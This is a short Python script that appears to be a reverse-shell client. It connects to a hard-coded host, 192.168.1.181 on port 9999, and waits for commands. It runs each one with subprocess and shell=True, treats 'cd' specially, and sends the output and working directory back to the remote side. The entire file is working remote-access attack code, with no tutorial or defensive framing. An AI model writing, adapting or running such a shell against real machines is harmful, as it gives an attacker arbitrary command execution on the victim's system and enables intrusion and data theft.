#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun Nov 15 09:27:22 2020

@author: trismonok
"""

import socket
import os
import subprocess

s = socket.socket()
host = "192.168.1.181"
port = 9999

s.connect((host,port))

while True:
    data = s.recv(1024)
    dim_data = len(data)
    
    # in case of cd commands
    if data[:2].decode("utf-8") == "cd" and dim_data == 2:
        home_dir = os.path.expanduser('~')
        os.chdir(home_dir)
        print(home_dir)
    elif data[:2].decode("utf-8") == "cd" and dim_data > 2:
        cwd = data[3:].decode("utf-8")       
        os.chdir(cwd)
        print(cwd)
    
    # other than cd commands 
    if dim_data > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        cwd = os.getcwd() + ">"
        s.send(str.encode(output_str + cwd))
        print(output_str)
            